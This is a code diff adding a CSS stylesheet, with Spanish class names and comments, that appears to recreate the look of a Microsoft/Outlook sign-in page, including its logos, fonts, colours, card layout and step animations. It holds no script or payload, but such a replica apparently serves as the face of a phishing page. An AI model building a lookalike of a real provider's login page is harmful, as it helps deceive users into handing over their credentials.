@@ -1,0 +1,385 @@
+html,
+body {
+    height: 100%;
+    background: url('/assets/background-dg4WtYa_.jpg');
+    background-repeat: no-repeat;
+    background-size: cover;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+}
+
+html {
+    box-sizing: border-box;
+}
+
+*,
+*:before,
+*:after {
+    box-sizing: inherit;
+}
+
+
+.contenedor {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    position: relative;
+    transform: translateY(-12px);
+}
+
+.outlook-logo {
+    padding: 0;
+    margin: 0;
+    margin-bottom: 24px;
+    max-height: 36px;
+    max-width: 256px;
+    overflow: clip;
+}
+
+.contenedor-iniciosesion {
+    background-color: white;
+    padding: 44px;
+    margin: 0 auto 20px auto;
+    width: 440px;
+    min-height: 338px;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+    overflow: hidden;
+    /* Oculta cualquier parte que se salga del contenedor */
+    position: relative;
+    /* Contenedor relativo para el posicionamiento absoluto del hijo */
+}
+
+.ms-logo-container {
+    height: 24px;
+    max-width: 256px;
+}
+
+.contenedor-iniciosesion input {
+    border-color: rgb(102, 102, 102);
+    padding: 6px 10px 6px 0;
+    border-width: 0px 0px 1px 0;
+    border-top-left-radius: 0px;
+    border-top-right-radius: 0px;
+    border-bottom-left-radius: 0px;
+    border-bottom-right-radius: 0px;
+    border-style: solid;
+    background-color: transparent;
+    width: 100%;
+    outline-style: none;
+    /* Quitar el borde al estar focus */
+    height: 36px;
+    padding: 6px 10px 6px 0;
+    font-size: 15px;
+    text-rendering: auto;
+    color: fieldtext;
+    letter-spacing: normal;
+    word-spacing: normal;
+    text-transform: none;
+    text-indent: 0px;
+    text-shadow: none;
+    display: inline-block;
+    text-align: start;
+    appearance: auto;
+    -webkit-rtl-ordering: logical;
+    cursor: text;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-weight: 400;
+}
+
+.contenedor-iniciosesion input::placeholder {
+    color: grey;
+    font-weight: 400;
+}
+
+.contenedor-iniciosesion input:focus {
+    border-color: rgb(0, 103, 184);
+}
+
+.contenedor-iniciosesion input.error {
+    border-color: rgb(232, 17, 35);
+}
+
+.textos {
+    margin-top: 5px;
+    margin-bottom: 14px;
+}
+
+input[type="email" i] {
+    padding-block: 1px;
+    padding-inline: 2px;
+    padding-left: 0;
+}
+
+
+.textos p {
+    padding: 0;
+    margin: 0;
+    font-size: 0.8125rem;
+    color: rgb(27, 27, 27);
+}
+
+.textos h2 {
+    font-size: 1.5rem;
+    font-weight: 600;
+    margin-bottom: 0;
+    padding: 0;
+}
+
+.registrar {
+    margin-bottom: 16px;
+    font-size: 0.8125rem;
+    line-height: 1.25rem;
+}
+
+.registrar span {
+    color: rgb(0, 103, 184);
+    cursor: pointer;
+}
+
+.registrar span:hover {
+    text-decoration: underline;
+    color: rgb(102, 102, 102);
+}
+
+.siguiente-container {
+    margin-top: 40px;
+    display: flex;
+    justify-content: end;
+}
+
+.btn {
+    color: rgb(255, 255, 255);
+    background-color: rgb(0, 103, 184);
+    border-color: rgb(0, 103, 184);
+    border: none;
+    border-width: 2px;
+    padding: 4px 12px;
+    line-height: normal;
+    min-width: 108px;
+    min-height: 32px;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-size: inherit;
+    font-weight: inherit;
+    font-size: 15px;
+    cursor: pointer;
+}
+
+.opciones-inicio button {
+    padding: 8px 44px;
+    cursor: pointer;
+    border: none;
+    background-color: rgb(255, 255, 255);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+    width: 440px;
+    display: flex;
+    align-items: center;
+}
+
+.llave {
+    width: 32px;
+    height: 32px;
+}
+
+.opcionesis {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    padding-left: 12px;
+    font-size: 15px;
+}
+
+.footer {
+    position: absolute;
+    left: 0;
+    bottom: 0;
+    background-color: rgba(0, 0, 0, 0.6);
+    width: 100%;
+    display: flex;
+    justify-content: end;
+    min-height: 28px;
+}
+
+.links {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+    margin-right: 12px;
+}
+
+.link {
+    color: rgb(255, 255, 255);
+    text-decoration: none;
+    font-size: 12px;
+}
+
+.link:last-child {
+    font-weight: 700;
+    transform: translateY(-2px);
+}
+
+.link:hover {
+    text-decoration: underline;
+}
+
+.flecha-email {
+    display: flex;
+    flex: column;
+    margin: 20px 0 0 0;
+    gap: 3px;
+}
+
+.flecha {
+    cursor: pointer;
+    border-radius: 20px;
+    width: 23px;
+    height: 23px;
+    display: flex;
+}
+
+.flecha:hover {
+    background-color: lightgray;
+}
+
+.flecha-email p {
+    font-size: 0.9375rem;
+}
+
+.escribircontra {
+    margin-top: 13px;
+}
+
+.error {
+    color: rgb(232, 17, 35);
+}
+
+/* Animaciones */
+
+.animar {
+    position: relative;
+    opacity: 1;
+}
+
+@keyframes slideInFromRight {
+    0% {
+        transform: translateX(100%);
+        /* Empieza fuera del contenedor a la derecha */
+        opacity: 0;
+    }
+
+    100% {
+        transform: translateX(0);
+        /* Posición final dentro del contenedor */
+        opacity: 1;
+    }
+}
+
+@keyframes slideOutToLeft {
+    0% {
+        transform: translateX(0);
+        /* Posición inicial dentro del contenedor */
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateX(-100%);
+        /* Se mueve hacia fuera del contenedor a la izquierda */
+        opacity: 0;
+    }
+}
+
+/* Animación de izquierda a derecha */
+@keyframes slideInFromLeft {
+    0% {
+        transform: translateX(-100%);
+        /* Empieza fuera del contenedor a la izquierda */
+        opacity: 0;
+    }
+
+    100% {
+        transform: translateX(0);
+        /* Posición final dentro del contenedor */
+        opacity: 1;
+    }
+}
+
+@keyframes slideOutToRight {
+    0% {
+        transform: translateX(0);
+        /* Posición inicial dentro del contenedor */
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateX(100%);
+        /* Se mueve hacia fuera del contenedor a la derecha */
+        opacity: 0;
+    }
+}
+
+/* Clases para aplicar las animaciones */
+.animate-in-right {
+    animation: slideInFromRight 0.25s ease-out forwards;
+}
+
+.animate-out-left {
+    animation: slideOutToLeft 0.25s ease-out forwards;
+}
+
+.animate-in-left {
+    animation: slideInFromLeft 0.25s ease-out forwards;
+}
+
+.animate-out-right {
+    animation: slideOutToRight 0.25s ease-out forwards;
+}
+
+@media (max-width: 600px) {
+    body {
+        background: none;
+        background-color: rgb(242, 242, 242);
+    }
+    .contenedor {
+        justify-content: unset;
+        transform: translateY(0);
+    }
+    .contenedor-iniciosesion {
+        padding: 24px;
+        border: 1px solid rgba(0, 0, 0, 0.4);
+        max-width: calc(-16px + 100vw);
+    }
+
+    .outlook-logo {
+        margin: 24px 0;
+    }
+
+    .opciones-inicio button {
+        padding: 8px 24px;
+        border: 1px solid rgba(0, 0, 0, 0.4);
+    }
+
+    .footer {
+        justify-content: left;
+    }
+
+    .links {
+        margin-left: 24px;
+    }
+}
+
+@media (max-width: 440px) {
+    .contenedor {
+        display: block;
+    }
+    .contenedor-iniciosesion {
+        margin-left: 8px;
+        margin-right: 8px;
+    }
+    .outlook-logo {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+    }
+}
